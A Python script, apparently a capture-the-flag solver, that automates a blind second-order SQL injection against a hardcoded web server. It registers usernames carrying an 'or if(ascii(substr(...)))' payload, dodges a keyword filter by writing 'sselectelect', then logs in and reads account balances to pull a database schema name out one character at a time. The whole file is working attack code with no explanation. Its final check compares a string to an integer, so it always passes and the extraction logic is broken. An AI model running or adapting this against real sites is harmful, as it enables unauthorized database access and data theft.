import requests
import string
import random
import re

Login_url = 'http://202.5.20.48/login.php'
Reg_url = 'http://202.5.20.48/register.php'
dic = string.digits + string.ascii_letters + '{},.!@#*()_-'
data_l = {
    'user': '',
    'pass': '123'
}

data_r = {
    'user': '',
    'pass': '123'
}
flag = ''

ss = requests.session()
for i in range(1, 20):
    for pl in dic:
        username = 'lyg' + ''.join(random.sample(string.ascii_letters, 8)) + "' or if(1,ascii(substr((select table_schema from information_schema.TABLES group by table_schema limit 1),{0},1))={1},1)#".format(i, ord(pl))

        data_l['user'] = username
        data_r['user'] = username.replace('select', 'sselectelect')
        html_r = ss.post(Reg_url, data=data_r).text
        reg_info = re.findall("alert\(\'(.*?)\'\)", html_r)[0]
        # print(html_r)
        print('username:{}, register info:{}'.format(data_r['user'], reg_info))
        if 'success' not in reg_info:
            continue
        html_l = ss.post(Login_url, data=data_l).text
        if 'wrong' in html_l:
            print('username:{}'.format(data_l['user']))
            print('login wrong')
            continue
        else:
            print('username:{}'.format(data_l['user']))
            print('balance:{}'.format(re.findall("you balance is (\d+)", ss.get('http://202.5.20.48/user.php').text)[0]))
        ss.get('http://202.5.20.48/buy.php?id=3')
        print('balance:{}'.format(re.findall("you balance is (\d+)", ss.get('http://202.5.20.48/user.php').text)[0]))
        
        if re.findall("you balance is (\d+)", ss.get('http://202.5.20.48/user.php').text)[0] != 2000000:
            flag += pl
            print(flag)
            break
